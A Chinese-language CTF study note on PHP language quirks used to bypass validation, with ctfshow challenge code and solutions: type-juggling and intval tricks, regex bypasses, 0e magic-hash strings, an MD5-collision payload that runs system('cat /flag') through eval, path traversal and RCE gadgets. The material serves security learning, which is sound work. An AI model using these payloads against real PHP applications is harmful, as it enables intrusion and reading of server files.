---
comments: true

---

# PHP特性





## 弱类型

### 自动 / 强制 类型转换

**语言特性**：PHP 是一个弱类型语言, 变量之间进行比较时, 若两个变量类型不一致, 会先进行强制类型转换，然后再进行比较。

官方文档位置：https://www.php.net/manual/zh/language.types.type-juggling.php

规则如下：

- 非数字开头的字符串转换成 int 类型时会变成 0, 数字开头的字符串转换 int 类型后会保留开头的数字
- 一个十进制数与十六进制/八进制数比较时, PHP 会将十六进制/八进制数转换为十进制数
- string 类型的转换会从最左边开始, 直到遇到非数字的字符时停止
- 含 e 的字符串转换成 int 类型时会被当做科学计数法处理, `123e456` 表示 123 的 456 次方
- `0e123` 表示 0 的 123 次方, 总是等于 0 `0e456` 同理
- 在数字开头加入 `\f \t \s \n \r` 等同样返回 true

```php
'a' == 0 // true

'1a' == 0 // false
'1a' == 1 // true

'a1' == 0 // true
'a1' == 1 // false

'123aa' == 123 // true
'aa123' == 123 // false

'123aa456' == 123 // true

'0e123' == '0e456' //true
```



### 强弱类型比较

官方文档位置：[https://www.php.net/manual/zh/language.operators.comparison.php](https://www.php.net/manual/zh/language.operators.comparison.php)

**==**  弱类型比较, 仅要求两边变量类型转换后的值相等

**===**  强类型比较, 不仅要求两个变量的值相等, 还要求变量的类型相同

同理 **!=** 是弱类型比较, 而 **!==** 是强类型比较

```php
'123' == 123 // true
'123' === 123 // false
```



## intval() 

基于获取变量的整数值函数的绕过 / 官方文档：https://www.php.net/manual/zh/function.intval.php

```php
intval(mixed $value, int $base = 10): int
# eg:
intval('0337522', 0); # 八进制
intval('0x1bf52', 0); # 十六进制
# -> 114514
```

当 `$base = 0` 时, 通过检测 var 的格式来决定使用的进制：

- 如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，
- 如果字符串以 "0b" (或 "0B") 开头，使用 2 进制 (binary)；否则，
- 如果字符串以 "0" 开始，使用 8 进制(octal)；否则，
- 将使用 10 进制 (decimal)。

另：intval 可以取整 (去除小数点后的部分) 和截断 (去除数字后的字符串, 包括科学计数法)

```php
intval('114514.0');
intval('114514.1');
intval('114514a');
intval('114514e123');
# -> 114514
```



### 例题

```php
# ctfshow-web90 
# 利用intval() $base = 0 的特性绕过：?num=010574
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```



## preg_match() 

正则函数缺陷 / 官方文档：https://www.php.net/manual/zh/function.preg-match.php

### 单行 / 多行匹配

[PHP文档 - 模式修饰符](https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers)

```php
# ctfshow-web91
# 正则表达式修饰符 ?cmd=%0aphp，同时不满足第二匹配(固定字符串"php")
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
}
```

扩展阅读：

```
匹配输入字符串的结尾位置。
如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 $。
```

所以如果设置RegExp 对象的 Multiline 属性的条件下，$还会匹配到字符串结尾的换行符（也就是%0a)

一个通过这种方式绕过的实例: [利用Apache解析漏洞（CVE-2017-15715）绕过上传黑名单](https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html)

### 数组绕过

```php
# ctfshow-web89 正则缺陷
# 利用数组绕过正则匹配，使其返回值发生错误而为false : ?num[]=1
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
}
```

### 正则回溯

[Phithon - PHP利用PCRE回溯次数限制绕过某些安全限制](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)

```php
# ctfshow - web130 web131
# 'f':'very'*250000+'ctfshow'
if(isset($_POST['f'])){
    $f = $_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f, 'ctfshow') === FALSE){
        die('bye!!');
    }

    echo $flag;

}
```



## strpos() 

字符串查找函数特性 / 官方文档：：https://www.php.net/manual/zh/function.strpos.php

`strpos('01234', 0)` 返回的结果是 0 对应的索引 0, 也就是 false

如果是 `!strpos()` 这种则会返回 true

代码使用了 `if(!strpos($str, 0))` 对八进制进行过滤, 可以在字符串开头加空格绕过

strpos() 遇到数组返回 null

strrpos() stripos() strripos() 同理

## is_numeric() 

数字或数字字符串检查函数 / 官方文档：https://www.php.net/manual/zh/function.is-numeric.php

特性：

- 可识别科学计数法，如：`0123e4567` 返回 true
- 包含非 e 字母返回 false
- 在数字**开头**加入空格 换行符 tab 等特殊字符可以绕过检测
- 可以尝试利用 base64 + bin2hex 找到一些只含 e 和数字的 payload

```php
is_numeric(' 36'); // true
is_numeric('36 '); // false
is_numeric('3 6'); // false
is_numeric("\n36"); // true
is_numeric("\t36"); // true
is_numeric("36\n"); // false
is_numeric("36\t"); // false
```

## in_array()

由于PHP自动 / 强制 类型转换的特性，会将待搜索的值的类型自动转换为数组中的值的类型。

```php
var_dump(in_array('1abc', [1,2,3,4,5])); // true
var_dump(in_array('abc', [1,2,3,4,5])); // false
var_dump(in_array('abc', [0,1,2,3,4,5])); // true
```

## ereg()

存在截断漏洞

`%00` 后面的字符串不解析

## trim()

不过滤 \f 换页符, url 编码后是 `%0c36`



## 变量覆盖

几种形式

```php
$$key = $$value;

extract()
parse_str()
import_request_variables()
```

思路是 `$_GET` `$_POST` `$_COOKIKE` 相互转换

或者利用 `$GLOBALS` 输出所有的全局变量

另外 parse_str() 接受数组传参 支持数组内变量覆盖

```
?_POST[key1]=36d&_POST[key2]=36d
```



## 路径穿越

通过绝对路径/相对路径绕过正则对文件名的检测, 例如 `preg_match('/flag.php/', $str)`

```
./flag.php
./ctfshow/../flag.php
/var/www/html/flag.php
```

利用 Linux 下的软链接绕过

[php源码分析 require_once 绕过不能重复包含文件的限制](https://www.anquanke.com/post/id/213235)

```
/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p
roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro
c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/
self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se
lf/root/proc/self/root/var/www/html/flag.php
```

## 哈希字符串

### 0e bypass

```php
$_GET['name'] != $_GET['password']
MD5($_GET['name']) == MD5($_GET['password'])
```

PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。

这一点在 md5() / sha1() 都适用，以下是可用的payload：

```
# md5 0e payload
QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
```

```
# sha1 0e payload
aaroZmOk
aaK1STfY
aaO8zKZF
aa3OFF9m
0e1290633704
10932435112
```

### Array bypass

md5 加密数组时返回 null

```php
$a = Array();
$b = Array();

md5($a) == md5($b); // null == null true
md5($a) === md5($b); // null === null true
```

sha1 同理

### 哈希碰撞

https://github.com/cr-marcstevens/hashclash

### 例题

```php
# ctfshow - web97
if (isset($_POST['a']) and isset($_POST['b'])) {
	if ($_POST['a'] != $_POST['b'])
		if (md5($_POST['a']) === md5($_POST['b']))
			echo $flag;
	else
		print 'Wrong.';
}
# a[]=1&b[]=2 -> 弱类型比较可以直接数组绕过，其结果都会转换为null
```

如果进行了string强制转类型后，则不再接受数组，以下为弱碰撞：

```php
$a=(string)$a;
$b=(string)$b;
if(  ($a!==$b) && (md5($a)==md5($b)) ){
	echo $flag;
}
# a=QNKCDZO&b=240610708
```

强碰撞则不为特性，这时需要找到两个真正的md5值相同数据：

```php
$a=(string)$a;
$b=(string)$b;
if(  ($a!==$b) && (md5($a)===md5($b)) ){
	echo $flag;
}
# 使用使用 fastcoll / hashclash 工具进行md5碰撞生成相同md5但不通变量值的内容
```

扩：

```php
# 2024 某地医疗行业 - 天使杯
if(isset($_GET['x']) && isset($_GET['y'])){
    $x=$_GET['x'];
    $y=$_GET['y'];
    if((string)$x!=(string)$y && md5($x)===md5($y)){
        eval($x.$y);
    }else{
        die("no no no~~~");
    }
}else{
    highlight_file(__FILE__);
}
```

a.txt:

```a.txt
system('cat /flag');//?>
```

bash:

```bash
>_:fastcoll_v1.0.0.5.exe -p a.txt -o 1.txt 2.txt

>_:x=system%28%27cat+%2Fflag%27%29%3B%2F%2F%3F%3E%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%11%82%91%ADm%E1g%0F%8CR%AB%5EF%0CH%C8%B7%1Ar0%B9d%1B%DDU%DEA%BA%C8%0B5B%F1%BB%06%C7%D8E%F3%C7%87%BE%C8%F4%1Cp%DBi%A3b%C7%9Bs%07%C6%A5%09%A3%C8uN%A7%2A%C8%7B%D0%C6%A98rd%ECZ%9CO%91%B7%12%AAV%40%EF%0Fs%13%C6%16r%D3ZnG%EC%87%FEk%10%3D%1E%19%F6%0F%DC%02%9A%83H%B7%C0%CC%E9j%28Q-%B6%5C%0Cd%A5%23%28%151%7E%A0%E4%2A&y=system%28%27cat+%2Fflag%27%29%3B%2F%2F%3F%3E%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%11%82%91%ADm%E1g%0F%8CR%AB%5EF%0CH%C8%B7%1Ar%B0%B9d%1B%DDU%DEA%BA%C8%0B5B%F1%BB%06%C7%D8E%F3%C7%87%BE%C8%F4%1C%F0%DBi%A3b%C7%9Bs%07%C6%A5%09%A3%C8%F5N%A7%2A%C8%7B%D0%C6%A98rd%ECZ%9CO%91%B7%12%AAV%40%EF%0F%F3%13%C6%16r%D3ZnG%EC%87%FEk%10%3D%1E%19%F6%0F%DC%02%9A%83H%B7%C0L%E9j%28Q-%B6%5C%0Cd%A5%23%28%15%B1%7E%A0%E4%2A
02ab0571e1aa07044856dd83f5048dc5
02ab0571e1aa07044856dd83f5048dc5
```



## 函数与数字运算

[https://www.php.net/manual/zh/language.operators.php](https://www.php.net/manual/zh/language.operators.php)

在 PHP 中, 函数与数字进行运算的时候, 函数能够被正常执行

```php
1+phpinfo()+1;
```

`+ - * / & |` 都行, 另外还有 `&& ||`



## 三目运算符构造语句

有时候构造不带分号 payload 时需要用到三目运算符

```php
return 1 ? phpinfo():1;
(<条件> ? 参数_1 : 参数_2)
```

1 永远为 true, 于是正常执行 phpinfo

## 根命名空间 \ 绕过过滤

上面的参考文章里也提到了

> PHP 的命名空间默认为 `\`, 所有的函数和类都在 `\` 这个命名空间中, 如果直接写函数名 function_name() 调用, 调用的时候其实相当于写了一个相对路径; 而如果写 \function_name() 这样调用函数. 则其实是写了一个绝对路径. 如果你在其他 namespace 里调用系统类, 就必须写绝对路径这种写法.

有时候可以绕过一些正则, 比如执行的代码不允许以字母开头

```php
\phpinfo();
```

## gettext()

不含字母数字的函数:`_()` 为 gettext() 别名, 类似于 echo 输出。

[https://www.php.net/manual/zh/function.gettext](https://www.php.net/manual/zh/function.gettext)

```php
var_dump(call_user_func(call_user_func("_", "get_defined_vars")));
```

以上命令可以返回所有已定义变量

## \$GLOBALS 和 get_defined_vars()

[https://www.php.net/manual/zh/reserved.variables.globals](https://www.php.net/manual/zh/reserved.variables.globals)

[https://www.php.net/manual/zh/function.get-defined-vars](https://www.php.net/manual/zh/function.get-defined-vars)

`$GLOBALS` 引用全局作用域中可用的全部变量

get_defined_vars() 返回由所有已定义变量所组成的数组

有时候可以从这里面查看 `$flag`

## 伪协议

[https://www.php.net/manual/zh/wrappers.php](https://www.php.net/manual/zh/wrappers.php)

常见的 php://filter php://input data:// 都很熟悉了

下面是一些不是很常见的 payload

```php
compress.zlib://flag.php
php://filter/ctfshow/resource=flag.php
```

php://filter 遇到不存在的过滤器会直接跳过, 可以绕过一些对关键字的检测

## 非法参数名传参

[PHP官方手册 - 来自 PHP 之外的变量](https://www.php.net/manual/zh/language.variables.external.php#language.variables.external)

## RCE 特性

> 该部分在RCE-labs中有了详细介绍，在特性中不在提及。

### 使用位运算构造webshell bypass

[Phithon - 一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)

[Phithon - 无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

### 无参数函数读文件/RCE

无参数函数指形如 `a(b(c()))` 这种不需要参数或者只需要一个参数, 并且对应的参数可以通过另一个函数的返回值来获取的函数

### create_function()

```php
call_user_func(callable $callback, mixed ...$args): mixed
```

### call_user_func()

```php
create_function(string $args, string $code): string
```

### 原生类列目录/RCE

一般都是 `echo new $v1($v2('xxx'))` 或者 `eval($v('ctfshow'))` 的形式, 有时候可以跳出来执行其它代码

ReflectionClass 和 Exception 里面可以执行其它函数

[PHP官方文档 - FilesystemIterator 列目录]([https://www.php.net/manual/zh/filesystemiterator.construct.php](https://www.php.net/manual/zh/filesystemiterator.construct.php))

```php
new Exception(system('xx'))
new ReflectionClass(system('xx'))
new FilesystemIterator(getcwd())
new ReflectionClass('stdClass');system()//
```

## 

## 序列化与反序列化特性

> 该部分在反序列化靶场中有了详细介绍，在特性中不在提及。

### 属性类型不敏感

在 PHP 7.1 + 的版本中, 对属性类型 (public protected private) 不敏感。

因为 protected 和 private 反序列化后的结果中含有 `%00`, 部分题目会禁止这种字符, 可在构造 payload 时将属性全部改成 public 来绕过限制。

### session.upload_progress

[PHP官方手册 - Session 上传进度](https://www.php.net/manual/zh/session.upload-progress.php#session.upload-progress)

该机制中的缓存可被文件包含和反序列化恶意利用。








